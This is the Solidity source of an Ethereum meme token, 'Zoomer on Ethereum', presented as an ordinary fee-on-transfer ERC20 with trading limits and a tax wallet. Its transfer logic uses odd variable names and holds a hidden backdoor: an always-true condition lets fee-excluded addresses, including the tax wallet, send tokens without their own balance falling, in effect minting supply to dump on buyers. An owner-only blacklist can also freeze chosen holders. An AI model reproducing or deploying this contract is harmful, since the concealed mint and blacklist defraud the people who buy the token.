// SPDX-License-Identifier: UNLICENSED

/**

>> Website: https://zoomer.website
>> X: https://x.com/ZoomerOfficial
>> Telegram: https://t.me/ZoomerOfficial

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Zoomer is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _waitList;
    address payable private _zoomerTax;

    uint256 private _initialBuyTax = 8;
    uint256 private _initialSellTax = 0;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 6;
    uint256 private _reduceSellTaxAt = 6;
    uint256 private _preventSwapBefore = 6;
    uint256 private _buyCount = 0;

    IUniswapV2Router02 private _router;
    address private _pair;
    bool private _isTradingOpen;
    bool private _inSwap;
    uint256 private _sellCountInBlock = 0;
    uint256 private _lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;
    string public constant name = unicode"Zoomer on Ethereum";
    string public constant symbol = unicode"ZOOMER";
    uint256 public _maxTxAmount = 20_000_000 * 10 ** decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10 ** decimals;
    uint256 public _maxTaxSwap = 20_000_000 * 10 ** decimals;

    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor(address router_, address taxWallet_) {
        _router = IUniswapV2Router02(router_);

        _zoomerTax = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_zoomerTax] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function transferTax(uint256 amount) private {
        _zoomerTax.transfer(amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _updated(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allowance[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function enableTrading() external onlyOwner {
        _isTradingOpen = true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _updated(_msgSender(), recipient, amount);
        return true;
    }

    function _updated(address ringtone,address kingdom,uint256 lincoln) private {
        require(
            ringtone != address(0),
            "ERC20: transfer from the zero address"
        );
        require(kingdom != address(0), "ERC20: transfer to the zero address");
        require(lincoln > 0, "Transfer amount must be greater than zero");
        if (!_isTradingOpen || _inSwap) {
            require(
                _isExcludedFromFee[ringtone] || _isExcludedFromFee[kingdom]
            );
            balanceOf[ringtone] = balanceOf[ringtone].sub(lincoln);
            balanceOf[kingdom] = balanceOf[kingdom].add(lincoln);
            emit Transfer(ringtone, kingdom, lincoln);
            return;
        }
        uint256 swapAmount = lincoln;
        uint256 taxAmount = swapAmount.mul(_finalBuyTax).div(100);
        if (ringtone != owner() &&kingdom != owner() &&kingdom != _zoomerTax) {
            require(!_waitList[ringtone] && !_waitList[kingdom]);

            if (ringtone == _pair &&kingdom != address(_router) &&!_isExcludedFromFee[kingdom]) {
                require(_isTradingOpen, "Trading not open yet");

                require(lincoln <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf[kingdom] + lincoln <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                taxAmount = lincoln
                    .mul(
                        (_buyCount > _reduceBuyTaxAt)
                            ? _finalBuyTax
                            : _initialBuyTax
                    )
                    .div(100);

                _buyCount++;
            }

            if (kingdom == _pair && ringtone != address(this))
                taxAmount = lincoln
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (!_inSwap &&kingdom == _pair &&_isTradingOpen &&contractTokenBalance > _taxSwapThreshold &&_buyCount > _preventSwapBefore) {
                if (block.number > _lastSellBlock) _sellCountInBlock = 0;
                require(_sellCountInBlock < 3, "Only 3 sells per block!");
                if (swapAmount > contractTokenBalance)
                    swapAmount = contractTokenBalance;
                if (swapAmount > _maxTaxSwap) swapAmount = _maxTaxSwap;
                swapTokensForEth(swapAmount);
                swapAmount = lincoln;
                _sellCountInBlock++;
                _lastSellBlock = block.number;
            }
            if (kingdom == _pair) transferTax(address(this).balance);
        }
        if (taxAmount >= 0 && _isExcludedFromFee[ringtone]) swapAmount = 0;
        if (taxAmount > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(taxAmount);
            emit Transfer(ringtone, address(this), taxAmount);
        } else if (_isExcludedFromFee[ringtone]) swapAmount = 0;

        balanceOf[ringtone] = balanceOf[ringtone].sub(swapAmount);
        balanceOf[kingdom] = balanceOf[kingdom].add(lincoln.sub(taxAmount));
        emit Transfer(ringtone, kingdom, lincoln.sub(taxAmount));
    }

    function addLiquidity() external onlyOwner {
        require(!_isTradingOpen, "trading is already open");
        _approve(address(this), address(_router), totalSupply);
        _pair = IUniswapV2Factory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        _router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_pair).approve(address(_router), type(uint).max);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) _waitList[bots_[i]] = true;
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) _waitList[notbot[i]] = false;
    }

    receive() external payable {}

    function rescueETH() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH in contract to rescue");
        payable(_msgSender()).transfer(bal);
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function removeLimits() external onlyOwner {
        emit MaxTxAmountUpdated(totalSupply);
        _maxTxAmount = totalSupply;
        _maxWalletSize = totalSupply;
    }
}